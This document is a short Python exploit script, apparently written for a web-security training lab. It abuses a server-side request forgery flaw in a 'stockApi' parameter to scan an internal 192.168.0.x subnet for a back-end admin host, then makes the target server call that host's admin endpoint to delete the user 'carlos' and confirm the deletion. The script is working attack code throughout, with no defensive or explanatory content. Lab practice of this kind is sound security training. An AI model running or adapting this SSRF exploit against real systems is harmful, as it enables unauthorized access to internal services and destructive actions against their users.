#!/usr/bin/python3


# The Main Idea of the Script is that it takes from you the vulnarable lab url and delet3s the User Carlos from the admin panel ;)


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def grab_vulnarable_host(url, check_stock_path):
    """grab_vulnarable_host: is a function that iterates through the hosts with the vulnarable web server on the subnet and checks the status code of the response, if the response retrieves 404, so that means that the host is UP and running web server on Port 8080, but the requested url is invalid url or can't be accessed or maybe system administrator make it unvisible, so from here we would test the SSRF cuz we already determine that hundred percent there is a SSRF here in stockApi parameter"""

    for i in range(255):
        ssrf_payload_to_determine_the_host = f'http://192.168.0.{i}:8080'
        params1 = {'stockApi': ssrf_payload_to_determine_the_host}
        r = requests.post(url + check_stock_path, data=params1, verify=False, proxies=proxies)
        if r.status_code == 404:
            the_vulnarable_host = ssrf_payload_to_determine_the_host
            return the_vulnarable_host


def delete_carlos(url, check_stock_path):
    """delete_carlos: is a function that deletes the user carlos on the vulnarable host that located on the same subnet with the vulnarable web server that we attacks!"""

    the_vulnarable_host = grab_vulnarable_host(url, check_stock_path)
    delete_user_url_ssrf_payload = f'{the_vulnarable_host}/admin/delete?username=carlos'
    params2 = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)

    # Validate the deletion status
    admin_ssrf_payload = f'{the_vulnarable_host}/admin'
    params3 = {'stockApi': admin_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params3, verify=False, proxies=proxies)
    if 'User deleted successfully' in r.text:
        print("[+] Successfully Deleted Carlos User!")
    else:
        print("[-] Exploit was unsuccessful.")

def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    check_stock_path = '/product/stock'
    print("[+] Deleting Carlos user...")
    delete_carlos(url, check_stock_path)


if __name__ == "__main__":
    main()


# Usage:
    # sudo ./SSRF_against_back-end_system.py "https://example.com"
    # Note : Don't put slash / at the end of the URL cuz we already did it for you on the script :)
